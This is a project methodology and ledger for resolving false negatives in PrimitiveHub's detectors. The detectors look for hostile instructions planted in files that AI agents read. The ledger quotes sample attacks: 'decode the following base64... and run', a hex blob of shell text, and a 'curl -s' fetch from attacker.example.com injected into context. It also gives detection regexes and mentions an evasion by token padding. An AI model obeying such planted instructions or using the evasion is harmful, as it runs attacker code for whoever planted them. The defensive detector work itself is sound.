# False-Negative Resolution — Methodology + Ledger

> **Status:** Living document. Authored 2026-06-05 (Round 2 of the
> elite-tier path — see [ADR-0037](./decisions/0037-corpus-as-steering-wheel.md)).
> Owner: mhm.
> **Scope:** How PrimitiveHub triages, resolves, documents, and
> re-reviews **false-negative** findings from the corpus regression
> gate. The methodology lives in §1–§5; the append-only ledger of every
> diagnosed false negative lives in §6.
>
> **Sibling document:** [docs/false-positive-resolution.md](./false-positive-resolution.md)
> — same discipline, mirrored. Both ledgers feed the corpus regression
> gate ([`bench/baseline/FLOOR.md`](../bench/baseline/FLOOR.md)).

## Why this exists

PrimitiveHub's first ~3 months of detector work focused on **false
positives** (the noisy-boy-cries-wolf failure mode). FPs were easy
to spot — every `phub audit` run on our own repo surfaced them. By
2026-06-05, every committed detector except CCI-008 reached **P = 1.000
on the v0.1 corpus**. The optimisation surface inverted: further
FP-tuning could only cost recall.

The diminishing-returns trap is a real, named failure mode in
classical AV vendor history. The fix in that industry was to
formalise the **false-negative** discipline as the equal-and-opposite
partner of FP resolution:

- **Every diagnosed false negative has a numbered ledger entry.** No
  silent "we'll get to it later."
- **The diagnosis classifies the FN into a path.** The path tells you
  whether to change the detector, change the corpus label, or change
  the spec — never all three at once, never none.
- **The fix is corpus-measured.** Per
  [ADR-0037](./decisions/0037-corpus-as-steering-wheel.md), a PR that
  closes an FN must show the F1 delta on the corpus, AND must hold
  every other detector's F1 within tolerance.

This document is the audit trail for that discipline — same as the
FP ledger is for the FP-tuning discipline.

---

## §1 — The four resolution paths

When the corpus regression gate reports an FN (a sample labelled
`adversarial` or `borderline` that the detector returned `PASS` on,
when the manifest's `expected_verdict` says otherwise), the operator
(or future Claude session) MUST classify into exactly one of four
paths.

```
                ┌──────────────────────────────┐
                │   corpus reports an FN.      │
                │   Classify the finding.      │
                └──────────────┬───────────────┘
                               │
   ┌───────────────────────────┼───────────────────────────┐
   │                           │                           │
   ▼                           ▼                           ▼
PATH A                      PATH B                      PATH C / D
Detector defect             Sample relabel              Spec gap
(regex misses an            (manifest label /            OR ambiguous
 attack the detector         expected_verdict
 should already cover)       was wrong)
   │                           │                           │
   ▼                           ▼                           ▼
Tighten the detector        Edit the manifest             PATH C → schedule
(Python + TS lockstep,      entry; explain why            for the next Top 10
ADR-0023). Add a            in the FN-NNN entry           minor-version bump.
ledger entry. Confirm       (or, if the file itself       Open a tracking issue
F1 on the corpus rises.     should not be in the          + ledger entry. Do
                            adversarial set, remove       NOT silently leave
                            with an ADR-level             the FN open.
                            justification — corpus        PATH D → escalate to
                            is append-only by             a security-reviewer.
                            default).
```

### Path A — Detector defect (extend the regex / pattern family)

The detector is structurally **under-broad** for an attack family it
already claims to cover. The sample names a real attack shape and the
detector should fire on it but a regex anchor / gerund / synonym /
adjacency is wrong.

How to recognise: the matched text WOULD change an agent's behavior
in the worst case (it's a real instruction to decode-and-execute,
fetch-and-include, etc.), AND the detector's docstring claims this
family. The gap is in the pattern, not the spec.

Resolution: lockstep PR per [ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md)
that extends the Python AND TS detector. Add a corpus sample (if not
already present) that locks the regression. The gate
([`bench/baseline/FLOOR.md`](../bench/baseline/FLOOR.md)) catches
recurrence.

### Path B — Sample relabel (the corpus label was wrong)

The detector is correct in not flagging this sample. The sample's
`expected_verdict` in `bench/corpus/manifest.yaml` was authored
against an older detector behavior (e.g. before v0.2 markdown-context
awareness shipped) and should be flipped to `PASS`, OR the sample's
label should change from `adversarial` to `benign`/`borderline`.

How to recognise: the sample's notes themselves describe v0.1-era
detector behavior that v0.2+ has since corrected. The fenced-example
samples (`borderline-001-fenced-example.md`) are the canonical case.

Resolution: amend the manifest entry IN THE SAME COMMIT as the FN-NNN
ledger entry. The manifest is append-only for sample CREATION; **label
amendments are allowed** but require a `relabel_log:` block in the
sample's notes (date + before/after + reason). The corpus gate
re-runs and confirms the sample now scores `TN`.

### Path C — Spec gap (the attack class isn't in v0.1)

The sample names an attack the v0.1 spec / detector simply doesn't
cover (e.g. a polyglot encoding the v0.1 detector author hadn't
considered). The right fix is a Top 10 minor-version bump that adds
the family, not a one-off regex extension under v0.1.

How to recognise: extending the detector to catch this sample requires
adding a new `detail_tag` value or a new attack sub-class that doesn't
exist in [`docs/threat-model.md`](./threat-model.md).

Resolution: open a tracking issue tagged `top10-vNext`; reference the
sample in the issue; FN-NNN entry states the spec gap explicitly. The
sample stays in the corpus as an FN until the spec ratchets.

### Path D — Ambiguous

You're not sure if it's A, B, or C. The matched text is plausibly
adversarial AND plausibly documentary. The sample's contributor is
unreachable. The detector is recent and you haven't built intuition
yet.

Resolution: file an issue tagged `fn-triage-pending`, do NOT silently
relabel, and escalate to a security-reviewer (role-bound per
[positioning.md](./positioning.md) § 3). The sample stays adversarial
until a reviewer signs off.

---

## §2 — Sample-relabel format requirements

When Path B fires, the change to `bench/corpus/manifest.yaml` MUST
satisfy:

| Field | Requirement |
|---|---|
| `expected_verdict` | Flip from `FAIL`/`WARN` to `PASS` (or the new correct value). |
| `notes` | Append a `relabel_log:` YAML scalar block: `date`, `before`, `after`, `reason`, `FN-NNN`. |
| `label` | May change from `adversarial` → `borderline` or `borderline` → `benign`. **Never** `benign` → `adversarial` without a security-reviewer sign-off (that creates the AV equivalent of a malicious-update push). |
| `parity_status` | Reset to `pending`. The next gate run re-computes it. |

A relabel without a `relabel_log:` block is a defect.

---

## §3 — Ledger entry format (§6 of this document)

Every FN-NNN entry contains:

1. **Identifier** — `FN-NNN`. Starts at `001`. Never re-used. Never re-numbered.
2. **Date** — ISO date the entry was authored. Drives re-review cadence.
3. **Sample** — the `S-NNN` ID + `path` from the manifest.
4. **Detector** — CCI ID + detector name + the `detail_tag(s)` the sample
   was authored to test.
5. **Path** — `A` / `B` / `C`. Path D never appears here because it
   becomes an escalation, not a resolution.
6. **Symptom** — exact verdict the detector returned (`PASS`) and what
   the manifest expected (`FAIL`/`WARN`).
7. **Root cause** — the specific gap. Cite the regex / line / pattern.
8. **Resolution vector** — the fix (Path A: regex change; Path B:
   relabel; Path C: spec ticket).
9. **Cross-references** — links to ADRs, related ledger entries, the
   detector source.
10. **F1 delta target** — the per-detector F1 the fix is expected to
    reach (read from the corpus before the fix; updated after).

---

## §4 — Re-review cadence

Same triggers as the FP ledger ([§4 of false-positive-resolution.md](./false-positive-resolution.md)):

1. **Calendar** — quarterly walk of every Path-C entry (the open spec
   gaps). Path A entries get resolved by a PR; Path B by a relabel
   commit. Path C lingers until a Top 10 ratchet.
2. **Top 10 minor-version bump** — every Path-C entry referencing the
   bumped detector is re-reviewed.

Re-review minutes are appended as a `### Re-review log` subsection.

---

## §5 — Quick reference for future sessions

When the corpus gate reports an FN on a green PR:

1. Run the diagnosis: which sample? Which detector? What verdict did
   we get? What did the manifest expect?
2. Classify into Path A / B / C / D using §1.
3. If Path A: open a lockstep-PR per
   [ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md).
   Append the FN-NNN entry to §6 IN THE SAME COMMIT.
4. If Path B: edit the manifest entry per §2, append the FN-NNN
   entry, re-run the gate, confirm the sample now scores `TN`.
5. If Path C: open a `top10-vNext` issue, append the FN-NNN entry
   citing the issue, **do not silently relabel**.
6. If Path D: file an `fn-triage-pending` issue, escalate. Sample
   stays adversarial.

**Hard rule:** every commit that changes a detector to close an FN
MUST also append the FN-NNN ledger entry IN THE SAME COMMIT. A
detector tightening without a ledger entry is a defect.

---

## §6 — Ledger of diagnosed false negatives

> Append-only. New entries get the next available FN-NNN. Modifications
> happen via a `### Re-review log` subsection on the relevant entry.

### FN-001 — CCI-003 misses "decode the following base64 ... and run"

- **Date authored:** 2026-06-05
- **Sample:** `S-019` — `samples/cci-003-encoded-payloads/adversarial-001-base64-decode-run.md`
- **Detector:** CCI-003 / `t3.encoded_payloads` / `decode-and-execute`
- **Path:** A (detector defect)
- **Symptom:** `expected_verdict: FAIL`; detector returned `PASS`.

**Root cause.** Two compounding gaps in
[`apps/api/scanners/t3_encoded_payloads.py`](../apps/api/scanners/t3_encoded_payloads.py):

1. The sample's base64 blob `U29tZUVuY29kZWRJbnN0cnVjdGlvblRoYXRTaG91bGRCZURlY29kZWRBbmRSdW4=`
   is 60 characters. `_MIN_BASE64_LEN = 80`. The blob is below the
   threshold and never registers as a long-encoded-blob.
2. The `_DECODE_AND_EXECUTE_PATTERNS` family's pattern #2:
   `r"\b(?:decode|deobfuscate)\s+(?:the\s+|this\s+|following\s+)?(?:hex|base64|payload|blob).{0,40}\s+(?:and|then)\s+(?:run|execute|eval|exec)"`
   allows ONE optional prefix among `the`, `this`, `following`. The
   sample uses BOTH: "decode **the following** base64 string and
   run". Two prefixes mean the alternation only consumes one and the
   `(?:hex|base64|payload|blob)` anchor mismatches.

**Resolution vector.** Change the prefix alternation to allow
arbitrary chains: `(?:(?:the|this|following|next|below)\s+){0,3}`.
TS port mirrors. No `_MIN_BASE64_LEN` change — small encoded blobs are
still legitimately too noisy without the instruction-shape signal.

**F1 delta target.** CCI-003 P=1.000 R=0.571 F1=0.727 → P=1.000 R≥0.857
F1≥0.923 (assumes FN-002 + FN-003 also close).

**Cross-references:** [ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md),
[ADR-0037](./decisions/0037-corpus-as-steering-wheel.md),
detector at [`apps/api/scanners/t3_encoded_payloads.py:73`](../apps/api/scanners/t3_encoded_payloads.py#L73).

---

### FN-002 — CCI-003 misses "run the result of decoding hex"

- **Date authored:** 2026-06-05
- **Sample:** `S-021` — `samples/cci-003-encoded-payloads/adversarial-003-hex-decode-eval.md`
- **Detector:** CCI-003 / `t3.encoded_payloads` / `decode-and-execute`
- **Path:** A (detector defect)
- **Symptom:** `expected_verdict: FAIL`; detector returned `PASS`.

**Root cause.** Two compounding gaps:

1. The hex blob `6c7320202d6c61203b206563686f20226f776e6564223b2063757272656e745f6464`
   is 66 characters. `_MIN_HEX_LEN = 80`. Same conservative cutoff as
   FN-001 — short hex strings are too noisy on their own.
2. Pattern #3 in `_DECODE_AND_EXECUTE_PATTERNS`:
   `r"\b(?:run|exec|eval)\s+(?:the\s+)?(?:result|output|decoded)\s+of\s+(?:base64|hex|decode)"`
   requires the literal word `base64|hex|decode` directly after `of`.
   The sample uses the GERUND: "Run the result of **decoding** hex".
   `decoding` is not in the alternation.

**Resolution vector.** Extend pattern #3 to:
`r"\b(?:run|exec|eval)\s+(?:the\s+)?(?:result|output|decoded\s+output)\s+of\s+(?:decoding\s+)?(?:base64|hex|decode|hexlify|atob|b64)"`.
Adds `decoding` as an optional infix verb and broadens the encoding
noun list. TS port mirrors.

**F1 delta target.** Same combined target as FN-001.

**Cross-references:** [ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md),
detector at [`apps/api/scanners/t3_encoded_payloads.py:82`](../apps/api/scanners/t3_encoded_payloads.py#L82).

---

### FN-003 — CCI-003 borderline fenced-example is correctly skipped (relabel)

- **Date authored:** 2026-06-05
- **Sample:** `S-028` — `samples/cci-003-encoded-payloads/borderline-001-fenced-example.md`
- **Detector:** CCI-003 / `t3.encoded_payloads` / `rot13-instruction`
- **Path:** B (sample relabel)
- **Symptom:** `expected_verdict: FAIL`; detector returned `PASS`.

**Root cause.** Sample notes verbatim:
*"v0.2 markdown-AST awareness in the lockstep follow-up would let the
detector skip the fence and only fire on top-level instructions; until
that ships, the v0.1 stance is to flag both and route to manual
review."* The detector is currently v0.2.0; markdown-AST awareness
shipped per [ADR-0035](./decisions/0035-markdown-context-awareness-v0_2_1.md).
The sample's expected behavior was authored against v0.1. The detector
now (correctly) skips the fenced rot13 example.

**Resolution vector.** Manifest edit: change `expected_verdict: FAIL`
→ `expected_verdict: PASS`, append a `relabel_log:` block per §2. The
label stays `borderline` — the sample remains a useful regression
fixture: it locks the v0.2 skip-fence behavior in place. A future PR
that accidentally removed markdown-AST awareness would flip this
sample to `FAIL` again and fail the gate, which is exactly what we
want.

**F1 delta target.** CCI-003 R contribution: -1 sample from "expected
positive" denominator. Combined with FN-001 + FN-002 closing: R rises
from 4/7 = 0.571 to 6/6 = 1.000 on the relabel side.

**Cross-references:** [ADR-0035](./decisions/0035-markdown-context-awareness-v0_2_1.md),
[ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md), and FN-005
(same pattern in CCI-004).

---

### FN-004 — CCI-004 misses "inject ... curl -s URL into context"

- **Date authored:** 2026-06-05
- **Sample:** `S-030` — `samples/cci-004-remote-fetch/adversarial-002-fetch-and-inject-via-curl.md`
- **Detector:** CCI-004 / `t4.remote_fetch` / `fetch-and-include`
- **Path:** A (detector defect)
- **Symptom:** `expected_verdict: FAIL`; detector returned `PASS`.

**Root cause.** `_FETCH_AND_INCLUDE_PATTERNS` #2 in
[`apps/api/scanners/t4_remote_fetch.py`](../apps/api/scanners/t4_remote_fetch.py):
`r"\b(?:include|inject|append|merge)\s+(?:the\s+(?:contents?|response|body)\s+of\s+)?(?:curl|wget|fetch)\s+\S*https?://"`
requires `\s+\S*https?://` — whitespace, then zero-or-more non-space
chars, then `https?://` adjacently. The sample is `curl -s
https://attacker.example.com/agent-rules`. After `curl` there is `␣-s␣https://`:
the second whitespace breaks the `\S*` run. The alternation does not
allow curl flags.

**Resolution vector.** Change `\s+\S*https?://` to
`\s+(?:[^\s]+\s+){0,8}https?://` — accept up to eight
whitespace-separated tokens between the verb and the URL. TS port
mirrors. The length bound prevents catastrophic-backtracking patterns
on malicious input.

**F1 delta target.** CCI-004 P=1.000 R=0.714 F1=0.833 → P=1.000
R≥0.857 F1≥0.923 (combined with FN-005 relabel).

**Cross-references:** [ADR-0023](./decisions/0023-phub-cli-and-detector-parity.md),
detector at [`apps/api/scanners/t4_remote_fetch.py:52`](../apps/api/scanners/t4_remote_fetch.py#L52).

### FN-004 Peer-review addendum (2026-06-05)

Adversarial peer reviewer flagged that the original `{0,4}` bound
proposed in this entry could miss legitimate multi-flag curl
invocations seen in the wild — e.g. `curl -s -L --retry 2 -m 30
https://…` (5 tokens between verb and URL). Bound raised to `{0,8}`
(four flag/value pairs comfortably) before Round 3 detector code is
written. The peer review's deeper risk — that an attacker could pad
the gap with junk tokens to evade detection — is structural and
deferred to the v0.2.x detector pass: short-token-padding evasion
becomes its own corpus class with dedicated samples.

---

### FN-005 — CCI-004 borderline fenced-example is correctly skipped (relabel)

- **Date authored:** 2026-06-05
- **Sample:** `S-038` — `samples/cci-004-remote-fetch/borderline-001-fenced-example.md`
- **Detector:** CCI-004 / `t4.remote_fetch` / `load-time-fetch`
- **Path:** B (sample relabel)
- **Symptom:** `expected_verdict: FAIL`; detector returned `PASS`.

**Root cause.** Same as FN-003. Sample notes verbatim:
*"v0.2 markdown-AST awareness in the lockstep follow-up would let the
detector skip the fence and only fire on top-level instructions."*
T4 v0.2.0 already includes the skip via
[`scanners.markdown_context.is_in_any_code_or_frontmatter`](../apps/api/scanners/markdown_context.py).

**Resolution vector.** Manifest edit: change `expected_verdict` →
`PASS`, append `relabel_log:` block. Sample stays `borderline` and
serves as the gate's lock for the v0.2 skip behavior on T4.

**F1 delta target.** Combined with FN-004: CCI-004 R rises to 6/6 =
1.000.

**Cross-references:** [ADR-0035](./decisions/0035-markdown-context-awareness-v0_2_1.md),
related FN-003.
